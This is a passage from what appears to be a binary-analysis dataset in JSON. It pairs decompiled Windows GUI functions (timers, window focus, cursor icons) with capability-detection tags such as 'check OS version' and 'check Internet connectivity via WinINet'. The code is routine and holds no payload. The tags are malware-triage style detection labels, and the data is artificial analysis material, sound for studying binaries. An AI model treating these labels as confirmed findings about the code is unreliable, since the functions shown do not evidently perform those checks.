        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00446ca8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00446ca8::var_1h + 1;\n    uStack32 = 0x446d1f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00446ca8::var_1h;\n    fcn.00446b4c(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.004471e8(),  cVar1 != '\\0')) {\n        fcn.00447b44();\n        (**(**(in_EAX + 0x4c) + 0x10))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x446d26;\n    iStack36 = 0x446d1e;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 308
    },
    "00446e10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446e10(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x49ac1c != 0) {\n        uStack24 = 0x446e55;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        uVar1 = 0;\n        sub.user32.dll_KillTimer(0, *0x49ac48);\n        *0x49ac48 = 0;\n        fcn.00446d88();\n        *in_FS_OFFSET = uVar1;\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00446e78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446e78(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x446fc5;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x446ea2;\n    fcn.00446dec();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x446ec1;\n        fcn.00447440();\n    }\n    puStack48 = 0x446ecb;\n    fcn.0044496c();\n    puStack48 = 0x446ed6;\n    fcn.0044d544();\n    puStack48 = 0x446ee3;\n    fcn.00447070();\n    bVar1 = true;\n    uStack52 = 0x446f6c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x12a) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0xc0) < 1) {\n        fcn.00446d88();\n    }\n    else if ((*0x49ac48 == 0) &&\n            (*0x49ac48 = sub.user32.dll_SetTimer(0, 0, *(in_EAX + 0xc0), fcn.00446e10),  *0x49ac48 == 0)) {\n        fcn.00446d88();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x446f86;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x495d24) {\n        puStack48 = 0x446f97;\n        cVar2 = fcn.0041f760();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x446faa;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x446fcc;\n    uStack40 = 0x446fc4;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 661
    },
    "00447070": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447070(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x447084;\n    fcn.00405974();\n    if (!in_ZF) {\n        puStack20 = 0x447090;\n        fcn.00405584();\n        if (*(in_EAX + 0x122) == 0) {\n            puStack20 = 0x4470b8;\n            fcn.00431bf8();\n            puStack20 = 0x4470c5;\n            fcn.0044a98c();\n            uStack24 = 0x4470f5;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x4470fc;\n            uStack24 = 0x4470f4;\n            fcn.00404650();\n            return;\n        }\n        puStack20 = 0x4470a8;\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "00447160": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447160(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.00443da0();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.00443d8c();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 0x1c4) == 0) || (cVar1 = fcn.004588a0(),  cVar1 == '\\0')) {\ncode_r0x004471c7:\n                        fcn.00447104(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.00458594(*(iVar3 + 0x1c4));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x004471c7;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00447104(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "004471e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004471e8(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX;\n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.0040700c();\n        uVar1 = fcn.0042d2bc();\n    }\n    return uVar1 & 0xffffff00 | *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 110
    },
    "00447208": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447208(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.0044724c();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.004449c4);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.00447440();\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00447440": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447440(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.004473cc();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.00444b2c();\n        fcn.0044724c();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00447478": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00447478(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x44748c;\n    var_4h = (***0x495974)();\n    puStack64 = &fcn.00447478::var_28h;\n    uStack68 = 0x447498;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x44749e;\n    iVar2 = sub.user32.dll_GetIconInfo();\n    if (iVar2 != 0) {\n        uStack76 = 0x4475bc;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x4474c2;\n        puStack72 = &stack0xfffffffc;\n        fcn.00426980();\n        puStack84 = 0x4474cd;\n        iVar2 = fcn.00402ee8();\n        uStack88 = 0x44758d;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = iVar2 + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_10h = iVar2;\n        cVar1 = fcn.00426a3c(var_8h);\n        if ((cVar1 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar3 = *(iVar2 + 4) * *(iVar2 + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar3 < 0) {\n                uVar3 = uVar3 + 7;\n            }\n            var_14h = uVar3 >> 3;\n            var_4h = fcn.00447468();\n            if ((var_4h == 0) && (SBORROW4(*(iVar2 + 8), *(iVar2 + 4) * 2) == *(iVar2 + 8) + *(iVar2 + 4) * -2 < 0)) {\n                var_4h = fcn.00447468();\n            }\n            var_4h = var_4h / var_14h - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x447594;\n        iStack92 = 0x44758c;\n        iVar2 = fcn.00402f1c();\n        return iVar2;\n    }\n    return var_4h;\n}\n",
        "token_count": 725
    },
    "00447630": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447630(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4476ce;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_8h = 0;\n    if (in_EAX != NULL) {\n        while (*in_EAX != '\\0') {\n            while (((cVar1 = *in_EAX,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                in_EAX = fcn.0040e778();\n            }\n            fcn.00405620();\n            iVar2 = fcn.0042551c();\n            if (var_8h < iVar2) {\n                var_8h = iVar2;\n            }\n            if (*in_EAX == '\\r') {\n                in_EAX = in_EAX + 1;\n            }\n            if (*in_EAX == '\\n') {\n                in_EAX = in_EAX + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4476d5;\n    uStack32 = 0x4476cd;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 353
    },
    "004476e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004476e0(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_6dh;\n    int32_t var_65h;\n    char var_5dh;\n    uint lpPoint;\n    uint var_58h;\n    uint dx;\n    uint dy;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint lprc;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4ch = *param_2;\n    var_48h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00405fe8();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    var_14h = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        fcn.00448248();\n        cVar2 = fcn.0043bad0();\n        if (cVar2 != '\\0') {\n            fcn.0044eda8();\n            iVar4 = fcn.004449a4();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_44h = *(var_4h + 0x60);\n                var_3ch = var_4ch;\n                var_38h = var_48h;\n                iVar4 = fcn.00447478();\n                var_38h = var_38h + iVar4;\n                var_34h = fcn.00443d20();\n                var_30h = *(var_4h + 0x5c);\n                fcn.00450150();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_58h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004047dc();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x1c4) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.00450370();\n                fcn.0044496c();\n                fcn.0044d500();\n                fcn.004055c8();\n                var_10h = *(var_4h + 0x74);\n                var_40h = *0x493500;\n                var_8h = 0;\n                arg_8h = &var_44h;\n                iVar4 = fcn.00451ae8(arg_8h);\n                var_5dh = iVar4 == 0;\n                if ((var_5dh) && (*(var_4h + 0x15a) != 0)) {\n                    (**(var_4h + 0x158))(&var_44h);\n                }\n                if ((var_5dh == '\\0') || (*(var_4h + 0x60) == 0)) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_ch != 0)) {\n                    fcn.004475d0(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x74))();\n                    (**(**(var_4h + 0x84) + 0xe8))(&var_6dh, var_8h);\n                    sub.user32.dll_OffsetRect(&var_6dh, var_3ch, var_38h);\n                    cVar2 = fcn.0040484c();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.00447630(&stack0xfffffffc);\n                        var_6dh = var_6dh - (iVar4 + 5);\n                        var_65h = var_65h - (iVar4 + 5);\n                    }\n                    fcn.004502c0();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.004502c0();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.004509a4();\n                    (**(**(var_4h + 0x84) + 0xe4))(var_8h);\n                    fcn.00444ab8();\n                    if (var_14h < 1) {\n                        fcn.00447208();\n                    }\n                    else {\n                        fcn.00447208();\n                    }\n                    goto code_r0x00447a42;\n                }\n            }\n        }\n    }\n    if (var_14h < 1) {\n        fcn.00447440();\n    }\n    else {\n        fcn.00447208();\n    }\ncode_r0x00447a42:\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405554();\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 1429
    },
    "00447a7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00447a7c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.0040676c(param_1);\n        if (iVar1 <= iVar2) break;\n        if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n            uVar3 = *(*(in_EAX + 0xd0) + iVar2 * 0xc);\n            goto code_r0x00447b3a;\n        }\n        if (*(*(in_EAX + 0xd0) + iVar2 * 0xc) == -1) break;\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = *(in_EAX + 0xcc);\n    *(in_EAX + 0xcc) = *(in_EAX + 0xcc) + 1;\n    iVar1 = fcn.0040676c();\n    if (iVar1 <= iVar2) {\n        iVar2 = fcn.0040676c();\n        fcn.00406928(iVar2 + 1);\n    }\n    *(*(in_EAX + 0xd0) + iVar2 * 0xc) = uVar3;\n    *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = param_2;\n    *(*(in_EAX + 0xd0) + 8 + iVar2 * 0xc) = *(param_2 + 0x344) != 0;\ncode_r0x00447b3a:\n    return CONCAT44(uVar3, uVar3);\n}\n",
        "token_count": 402
    },
    "00447b44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447b44(void)\n\n{\n    if ((*(*0x49ac20 + 0x68) == 0) || (*(*(*0x49ac20 + 0x68) + 0x284) == 0)) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00447b80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447b80(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0xf2) != 0) {\n        (**(in_EAX + 0xf0))();\n    }\n    iVar1 = sub.user32.dll_GetActiveWindow();\n    if (iVar1 == 0) {\n        sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n    }\n    return CONCAT44(iVar1, iVar1);\n}\n",
        "token_count": 115
    },
    "00447bc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447bc8(void)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = 0;\n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uStack8 = fcn.00458594();\n    }\n    return CONCAT44(uStack8, uStack8);\n}\n",
        "token_count": 110
    },
    "00447c08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00447c08(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uStack24;\n    \n    iVar4 = *(*0x49ac20 + 0x68);\n    if (iVar4 == 0) {\ncode_r0x00447c33:\n        if ((iVar4 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar4 = fcn.00451ae8(param_1);\n            if (iVar4 == 1) goto code_r0x00447c53;\n        }\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.00451ae8(param_1);\n        if (iVar3 != 1) goto code_r0x00447c33;\ncode_r0x00447c53:\n        uVar1 = 1;\n    }\n    uStack24 = param_2 & 0xffffff00 | uVar1;\n    if (uVar1 == 0) {\n        cVar2 = fcn.004047dc();\n        if ((((cVar2 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) &&\n           ((*(param_1 + 0x1c) & 0x10) == 0)) {\n            fcn.0044a850();\n        }\n    }\n    return CONCAT44(uStack24, uStack24) & 0xffffffff000000ff;\n}\n",
        "token_count": 383
    },
    "00447ca0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447ca0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))();\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "00447cc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447cc8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xe2) != 0) {\n        (**(in_EAX + 0xe0))();\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "00447e8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447e8c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.0042fabc();\n    if ((cVar1 == '\\0') || (cVar1 = fcn.004588a0(),  cVar1 == '\\0')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            uVar3 = fcn.00458594(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    else {\n        iVar2 = fcn.00447dd8();\n        if (*(iVar2 + 8) == '\\0') {\n            fcn.00403af4();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            fcn.00458594();\n            fcn.0042f990();\n            (**(*in_EAX + 0x80))();\n        }\n        else {\n            uVar3 = fcn.00458594(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "004480c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004480c4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 8) != '\\0') {\n        cVar1 = fcn.0042fabc();\n        if ((cVar1 != '\\0') &&\n           ((((*(in_EAX + 0x28) != '\\0' || (*(in_EAX + 0xc) != 0)) || (*(in_EAX + 0x10) != 0)) ||\n            ((*(in_EAX + 0x14) != 0 || (*(in_EAX + 0x18) != 0)))))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 159
    },
    "004480fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004480fc(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 2)) {\n        *(in_EAX + 2) = param_2;\n        if ((*(in_EAX + 2) != '\\0') && (*(in_EAX[1] + 0x350) != '\\0')) {\n            fcn.004434e0();\n        }\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "004481c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004481c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0043b6f8();\n    if (iVar1 != 0) {\n        *0x49ac2c = 0;\n        sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n        if ((*(*(in_EAX + 0x44) + 0x273) == '\\x01') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\n            fcn.0043fd50();\n            fcn.00442b48();\n        }\n        fcn.0044542c();\n        fcn.00445588();\n        if (*(*0x49ac20 + 100) != 0) {\n            uVar2 = fcn.00458594();\n            sub.user32.dll_SetFocus(uVar2);\n        }\n        if (*(in_EAX + 0x14a) != 0) {\n            (**(in_EAX + 0x148))();\n        }\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "00448260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448260(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4482c3;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x49ac24 = *0x49ac24 + 1;\n    if (*0x49ac24 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x49ac1c != 0) {\n            iStack20 = 0x448287;\n            fcn.0043b834();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x49ac34 != 0) {\n            iStack20 = *0x49ac34;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        fcn.004193e8();\n        fcn.00406934();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 270
    },
    "004485d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004485d0(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 50
    },
    "004485d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004485d8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.004487a8();\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00448770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
